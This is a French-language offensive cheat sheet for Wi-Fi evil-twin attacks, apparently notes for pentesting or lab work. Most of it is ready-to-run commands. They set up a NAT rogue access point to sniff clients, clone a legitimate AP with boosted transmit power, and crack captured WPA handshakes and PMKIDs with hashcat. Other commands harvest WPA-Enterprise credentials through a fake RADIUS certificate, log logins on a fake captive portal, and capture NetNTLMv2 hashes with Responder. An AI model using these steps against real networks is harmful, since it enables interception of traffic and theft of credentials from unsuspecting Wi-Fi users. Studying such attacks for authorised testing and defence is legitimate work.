# Evil-twin
## Sniffer le traffic

Créer un AP ouvert qui route le trafic des clients vers internet via ta machine. Tu te positionnes en MITM transparent - les clients naviguent normalement, tu captures tout. Pas de clonage d'AP existant, juste un réseau fictif.

### Setup
```bash
iwconfig
ip addr add 10.0.0.1/24 dev wlan0

echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

```bash
dnsmasq --interface=wlan0 --dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h --no-daemon
```

### Open

AP sans authentification.
```bash
sudo ./eaphammer -i wlan0 -e testopen --auth open
```

### PSK

AP protégé WPA avec un mot de passe.
```bash
sudo ./eaphammer -i wlan0 -e testpsk --auth wpa-psk --wpa-passphrase Password123!
```
Une fois connecté avec le client tester en se rendant sur ce site : http://zero.webappsecurity.com/login.html

## Stealing credentials

Cloner un AP légitime pour tromper les clients et récupérer leurs credentials. L'objectif est que le client s'associe à ton rogue AP plutôt qu'au vrai - d'où l'importance de reproduire fidèlement le réseau et d'avoir un signal dominant.

### Puissance TX

```bash
iw dev wlan0 info        # puissance actuelle (txpower)
iw phy phy2 info         # puissance max (sous "max TX power")

sudo iw dev wlan0 set txpower fixed 3000   # forcer à 30 dBm (valeur en mBm = dBm × 100)
```

> Augmenter la puissance TX permet de dominer le signal de l'AP légitime et forcer les clients à s'associer à ton rogue AP.

### Reproduire le réseau Wi-Fi

Scanner les AP à portée pour récupérer les paramètres du réseau cible (ESSID, BSSID, canal, bande). Ces infos sont ensuite passées à eaphammer pour cloner l'AP de façon identique.

```bash
sudo iwlist wlan0 scan 
```

| Paramètre     | Option CLI          | Description                |
| ------------- | ------------------- | -------------------------- |
| Interface     | `-i`, `--interface` | Interface Wi-Fi            |
| ESSID         | `-e`, `--essid`     | Nom du réseau              |
| BSSID         | `-b`, `--bssid`     | Adresse MAC de l'AP        |
| Canal         | `-c`, `--channel`   | Canal Wi-Fi                |
| Mode matériel | `--hw-mode`         | `g` (2.4GHz) ou `a` (5GHz) |

### PSK

Cloner un réseau WPA-PSK sans connaître le mot de passe. Quand un client tente de s'associer, on capture le handshake ou le PMKID, puis on le craque offline avec hashcat.

```bash
sudo ./eaphammer -i wlan0 -e testpsk --auth wpa-psk
```

```bash
hcxhash2cap --hccapx=loot/file.hccapx -c capture.pcap
hcxpcapngtool capture.pcap -o capture.hc22000
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
```

### EAP

Cibler les réseaux WPA-Enterprise (PEAP, TTLS…). eaphammer génère un faux certificat et se fait passer pour le serveur RADIUS. Quand un client s'authentifie, il envoie ses credentials (domaine\utilisateur + hash du mot de passe) directement capturés.

```bash
sudo ./eaphammer --cert-wizard  
sudo ./eaphammer -i wlan0 -e testeap --auth wpa-eap --creds
```

### Captive portal

AP ouvert qui redirige les clients vers une fausse page web (style portail hôtel/aéroport). La victime remplit un formulaire de connexion et ses credentials sont loggés. Les templates permettent de personnaliser la page d'accueil.

```bash
sudo ./eaphammer -i wlan0 -e captive-portal --auth open --captive-portal

./core/wskeyloggerd/templates/user_defined/
sudo ./eaphammer --list-templates
sudo ./eaphammer --delete-template --name nom_template
```

### Hostile portal (Responder - NetNTLMv2)

AP ouvert qui force les machines Windows à s'authentifier automatiquement via NTLM (sans interaction utilisateur). Les hashes NetNTLMv2 capturés peuvent ensuite être craqués ou relayés.

```bash
sudo ./eaphammer -i wlan0 -e hostile-portal --auth open --hostile-portal
```

> --hostile-portal démarre responder en arrière plan
# Attacks

## PMKID

Attaque WPA2-PSK qui ne nécessite pas de capturer un handshake complet ni d'attendre qu'un client se connecte. Le PMKID est un identifiant récupérable directement depuis les trames de l'AP, dérivé du PMK - et donc craquable offline.

- https://github.com/s0lst1c3/eaphammer/wiki/XII.-PMKID-Attacks-Against-WPA-PSK-and-WPA2-PSK-Networks

## PSK

Attaque par dictionnaire / bruteforce sur un handshake WPA capturé. airgeddon est un framework interactif qui automatise la capture et le crack.

- https://github.com/v1s1t0r1sh3r3/airgeddon
- https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards%20and%20Chipsets
